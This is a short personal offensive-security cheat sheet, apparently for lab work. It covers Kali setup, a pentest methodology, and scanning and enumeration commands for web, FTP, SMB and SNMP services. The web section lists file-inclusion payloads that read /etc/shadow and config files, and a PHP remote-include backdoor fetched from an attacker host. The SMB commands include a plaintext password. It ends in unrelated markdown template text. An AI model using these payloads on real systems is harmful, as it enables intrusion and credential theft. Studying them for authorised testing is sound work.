# a no-bullshit offsec guide 

### disclaimer:
The information on this website is for educational purposes only. The author of this work will not be held accountable for any use or misuse of the information on this website. As there is always some risk involved, the author is not responsible for any effects or consequences from the use of any suggestions, recommendations, or procedures described herein. 


## dump windows 
 

- linux is open source, that means you have millions of lines of code at your disposal for free.

- modular applications and libraries in linux 

- super fast boot time

- no annoying updates 

- lightening fast on low ram

- free

- portable, yes even on a usb

- secure

- most tools are written in linux

- most web servers run in linux due to its stability


- easier to use than mainstream opinion


i use kali linux by offensive security. you can either use it on a virtualization software like virtualbox/vmware or use it as a partition along with your host os.

[1. installation guide for virtualization](https://phoenixnap.com/kb/how-to-install-kali-linux-on-virtualbox)

[2. installation guide for main os](https://techsprobe.com/how-to-install-kali-linux-2020-on-a-laptop-pc/)

## secure your kali installation

- change your default root password

- change your default ssh keys

- add an unprivileged user to work on, give it sudo rights with a password

- change your mac address with macchanger

- install tor and proxychains

- install anonsurf

- check open ports on your localhost (sudo ss -tulwn)

- close unnecessary ports/services (sudo service <service name> stop)


[1. guide to secure kali](https://alphacybersecurity.tech/how-to-secure-your-kali-linux-machine/)

[2. guide to secure kali further](https://thehacktoday.com/how-to-protect-yourself-while-hacking-in-kali-linux/)




**## the methodology i follow**


- initial scoping

- recon 

- enumerate all attack surfaces

- search/create an exploit

- run exploit

- get shell

- upgrade shell

- enumerate the target

- escalate privileges

- gain root access

- write a report


## scoping
clearly understand which targets your have permission to scan/attack, do not break the law as it would hamper your reputation as a security researcher

## recon

recon wide to gather information on as many potential attack surfaces as possible

### 1. masscan

fast full port scanner
```
masscan -i tun0 -p1-65535 --rate=1000 IP
```
  
### 2. nmap

this handy little tool lets you see which ports are open on the target along with other information about the target

```
nmap -sTV -v -p- IP
sudo nmap -sU -v IP

 ``` 
 
 ### 3. nmapAutomater
 
a useful script to automate the scanning process

```
 ./nmapAutomater.sh IP All
 ./nmapAutomater.sh IP Vulns
 ./nmapAutomater.sh IP Quick
 ./nmapAutomater.sh IP Full
```

shoutout to @21y4d for this

[check it out on github here](https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh)

## enumerate 

upgrade searchsploit 

```
searchsploit -u
```
search for exploits 

```
searchsploit <service>

google site:exploitdb <service version>
google service version exploit
```

### 1. HTTP  80, 8000, 8080

```
nikto -h IP
curl -i http(s)://IP/robots.txt
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://<IP>/FUZZ.txt" -t 100
wfuzz -c -z range, 1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
```

- fire up dirbuster with a medium wordlist

- browse the site with a burpsuite proxy running

- look for SQL injection parameters in GET/POST

- LFI with ?file=foo parameter

- /etc/passwd /etc/shadow

- /var/www/html/config.php

- ?page=php://filter/convert.base64-encode/resource=../config.php

- ../../../../../boot.ini for version

- RFI backdoor

```
- <?php include $_GET['inc']; ?>
```
- access backdoor with http://IP/inc.php?inc=http://YOURIP/bd.php

- phpinfo()

### 2. HTTPS 443

- check out potential usernames in the ssl cert and the correct vhost
- look for heartbleed vuln

### 3. FTP 21

- anonymous login

```
ftp IP
anonymous:anonymous
```
- vulns in version
- traverse filesystem look for password files, system configs, BOF targets, OS version
- check upload potential

### 4. SMB 139,445

-check if exploitable by msf

```
enum4linux -a IP
smbclient -L IP
locate *.nse | grep smb
nmap -p 139,445 --script=$scriptname $targetip
nmap -p 139,445 --script=smb-vuln* $targetip -v
enum4linux -a $targetip
enum4linux -a $targetip
smbmap -H $targetip
smbclient \\\\10.10.10.3\\tmp
rpcclient -U "" -N 10.10.10.3
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//IP/My Share" /mnt/cifs
smbmap -H 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'
nbtscan -r 10.10.10.0/24
sudo nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln* 10.10.10.4
psexec to login to samba
```
### 4. SNMP UDP 161

```
snmp-check
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
onesixtyone -c community -i ips
snmpwalk -c public -v1 10.10.10.10
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
```




















### Markdown

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for

```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```
